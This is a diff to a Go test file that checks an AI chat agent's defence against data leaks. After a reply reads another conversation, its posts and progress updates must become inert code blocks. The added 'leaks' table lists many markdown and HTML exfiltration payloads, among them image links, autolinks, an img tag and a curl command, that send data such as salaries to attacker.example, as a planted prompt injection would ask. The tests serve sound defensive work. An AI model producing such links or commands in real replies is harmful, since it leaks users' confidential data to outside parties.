@@ -65,6 +65,7 @@ type outboundReply struct {
 	search *engine
 	fetch  *pages
 	writes []string
+	chat   outbound
 	logs   bytes.Buffer
 }
 
@@ -80,7 +81,8 @@ func newOutboundReply(t *testing.T, restrict bool) *outboundReply {
 		t.Fatal(err)
 	}
 	r := &outboundReply{search: &engine{}, fetch: &pages{text: "page"}}
-	b := tools.Builtin{Search: r.search, Fetch: r.fetch, SearchLimit: 3, Catalog: c, RestrictOutbound: restrict}
+	b := tools.Builtin{Search: r.search, Fetch: r.fetch, SearchLimit: 3, Chat: &r.chat, MaxProgressUpdates: 1,
+		ProgressUpdateMaxChars: 500, Catalog: c, RestrictOutbound: restrict}
 	b.Log = slog.New(slog.NewTextHandler(&r.logs, nil))
 	contributed := []tool.Tool{channelReader{name: "channel_posts", report: true}, channelReader{name: "notes"},
 		workItemWriter{&r.writes}}
@@ -154,5 +156,79 @@ func TestUnrestrictedRepliesRunOutboundCallsAfterReadingAnotherConversation(t *t
 	r.execute("channel_posts", `{"channel_id": "elsewhere"}`)
 	if got := r.exfiltrate(); got[0] != "[]" || got[1] != "page" || got[2] != "created" || r.outboundCalls() != 3 {
 		t.Errorf("results %q after %d calls, want the search, the page, and the write", got, r.outboundCalls())
+	}
+}
+
+// leaks are posts a planted instruction asks for, each carrying what the reply read in a URL, with the length of
+// the backtick fence that makes them inert.
+var leaks = []struct {
+	post  string
+	fence int
+}{
+	{"Done. ![status](https://attacker.example/s.png?d=salary%20table =1x1 \"t\")", 3},
+	{"![status][s]\n\n[s]: https://attacker.example/s.png?d=salaries", 3},
+	{"[report](<https://attacker.example/?d=salaries> \"t\")", 3},
+	{"[report][r] [r]\n\n[r]: <https://attacker.example/?d=salaries>", 3},
+	{"See <https://attacker.example/?d=salaries>.", 3},
+	{"See https://attacker.example/?d=salaries, or WWW.attacker.example/?d=salaries.", 3},
+	{"_https://attacker.example/?d=S _www.attacker.example/?d=S xwww.attacker.example/?d=S www1.attacker.example/?d=S", 3},
+	{"https:attacker.example/?d=S attacker.example/?d=S", 3},
+	{"Run `curl https://attacker.example/?d=S` now", 3},
+	{"`https://attacker.example/?d=S\nhttps://attacker.example/?d=S`\n<https://attacker.example/?d=S>`", 3},
+	{"Run ``ls``: <https://attacker.example/?d=`salaries`>", 3},
+	{`<img src="https://attacker.example/s.png?d=salaries">`, 3},
+	{"[![status](https://attacker.example/s.png?d=1)](https://attacker.example/?d=2)", 3},
+	{"<![http](x)s://attacker.example/?d=salaries>", 3},
+	{"[a]![](x)(//attacker.example/s.png?d=salaries)", 3},
+	{"```\n```\n![status](https://attacker.example/s.png?d=S)\n```", 4},
+	{"~~~\n![status](https://attacker.example/s.png?d=S)\n`````` x", 7},
+}
+
+func TestPostsOfAReplyThatReadAnotherConversationAreOneCodeBlock(t *testing.T) {
+	for _, l := range leaks {
+		r := newOutboundReply(t, true)
+		r.execute("channel_posts", `{"channel_id": "elsewhere"}`)
+		fence := strings.Repeat("`", l.fence)
+		want := fence + "\n" + l.post + "\n" + fence
+		if got := r.set.Post(l.post); got != want {
+			t.Errorf("reply %q posted as %q, want %q", l.post, got, want)
+		}
+		args, _ := json.Marshal(map[string]string{"message": l.post})
+		r.execute("send_progress_update", string(args))
+		if len(r.chat.sent) != 1 || r.chat.sent[0].Text != want {
+			t.Errorf("progress update %q posted as %+v, want %q", l.post, r.chat.sent, want)
+		}
+	}
+}
+
+func TestInertPostOfALargeCraftedReplyIsBuiltInOnePass(t *testing.T) {
+	r := newOutboundReply(t, true)
+	r.execute("channel_posts", `{"channel_id": "elsewhere"}`)
+	crafted := strings.Repeat("!", 20000) + strings.Repeat("[][]", 20000)
+	if allocs := testing.AllocsPerRun(5, func() { r.set.Post(crafted) }); allocs > 4 {
+		t.Errorf("posting a 100 KB reply took %v allocations, want at most 4", allocs)
+	}
+}
+
+func TestPostsAreUnchangedUnlessARestrictedReplyReadAnotherConversation(t *testing.T) {
+	const ordinary = "Found it: [docs](https://example.com/docs) ![chart](https://example.com/c.png)"
+	for name, c := range map[string]struct {
+		restrict bool
+		read     string
+	}{
+		"no other conversation read": {true, "here"},
+		"unrestricted":               {false, "elsewhere"},
+	} {
+		r := newOutboundReply(t, c.restrict)
+		r.execute("channel_posts", `{"channel_id": "`+c.read+`"}`)
+		for _, l := range leaks {
+			if got := r.set.Post(l.post); got != l.post {
+				t.Errorf("%s: reply %q posted as %q", name, l.post, got)
+			}
+		}
+		r.execute("send_progress_update", `{"message": "`+ordinary+`"}`)
+		if len(r.chat.sent) != 1 || r.chat.sent[0].Text != ordinary {
+			t.Errorf("%s: progress update posted as %+v, want %q", name, r.chat.sent, ordinary)
+		}
 	}
 }
